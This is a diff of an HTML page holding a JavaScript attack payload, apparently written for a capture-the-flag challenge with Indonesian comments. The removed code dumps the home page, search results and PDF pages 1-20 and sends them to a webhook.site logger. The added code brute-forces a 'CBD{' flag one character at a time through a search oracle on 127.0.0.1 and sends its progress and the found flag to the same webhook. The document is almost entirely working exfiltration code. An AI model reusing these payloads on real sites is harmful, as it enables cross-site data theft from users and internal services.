@@ -1,34 +1,52 @@
+<!DOCTYPE html>
+<html>
+<body>
 <script>
-const WEBHOOK = "https://webhook.site/a40b633a-f128-4f03-aaba-0122b02d749c";
+const TARGET = "http://127.0.0.1/search?q=";
+const LOGGER = "https://webhook.site/a40b633a-f128-4f03-aaba-0122b02d749c";
+const ALPHABET = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_";
 
-// fungsi kirim data
-function send(tag, data) {
-  fetch(WEBHOOK + "?tag=" + tag + "&d=" + btoa(data)).catch(()=>{});
+// kirim progress ke webhook
+function log(msg) {
+  fetch(LOGGER + "?d=" + encodeURIComponent(msg)).catch(()=>{});
 }
 
-// dump halaman utama
-fetch("/")
-  .then(r => r.text())
-  .then(d => send("home", d));
+// cek apakah prefix menghasilkan hasil
+async function check(prefix) {
+  try {
+    const res = await fetch(TARGET + encodeURIComponent(prefix));
+    const text = await res.text();
 
-// dump search kosong
-fetch("/search?q=")
-  .then(r => r.text())
-  .then(d => send("search", d));
-
-// brute PDF ID (ini penting)
-for (let i = 1; i <= 20; i++) {
-  fetch("/pdfs/" + i)
-    .then(r => r.text())
-    .then(d => send("pdf_" + i, d))
-    .catch(()=>{});
+    // ini kunci: beda response
+    return !text.includes("No visible PDF matched");
+  } catch (e) {
+    return false;
+  }
 }
 
-// coba raw juga
-for (let i = 1; i <= 20; i++) {
-  fetch("/pdfs/" + i + "/raw")
-    .then(r => r.text())
-    .then(d => send("raw_" + i, d))
-    .catch(()=>{});
+async function solve(prefix) {
+  log("progress: " + prefix);
+
+  for (const c of ALPHABET) {
+    const attempt = prefix + c;
+    const ok = await check(attempt);
+
+    if (ok) {
+      log("found: " + attempt);
+
+      if (c === '}') {
+        log("FLAG: " + attempt);
+        return;
+      }
+
+      await solve(attempt);
+      return;
+    }
+  }
 }
+
+// mulai dari prefix flag
+solve("CBD{");
 </script>
+</body>
+</html>
